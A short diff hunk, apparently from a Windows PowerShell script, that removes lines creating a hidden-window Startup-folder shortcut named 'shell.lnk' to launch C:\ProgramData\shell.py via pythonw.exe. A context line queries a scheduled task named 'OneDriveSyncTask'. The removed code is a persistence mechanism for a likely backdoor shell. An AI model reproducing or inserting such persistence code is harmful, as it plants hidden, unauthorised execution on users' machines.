@@ -18,9 +18,3 @@ schtasks /query /tn "OneDriveSyncTask" /fo LIST /v
 
 
 
-$Wsh = New-Object -ComObject WScript.Shell
-$s = $Wsh.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\shell.lnk")
-$s.TargetPath = "pythonw.exe"
-$s.Arguments = "C:\ProgramData\shell.py"
-$s.WindowStyle = 7
-$s.Save()
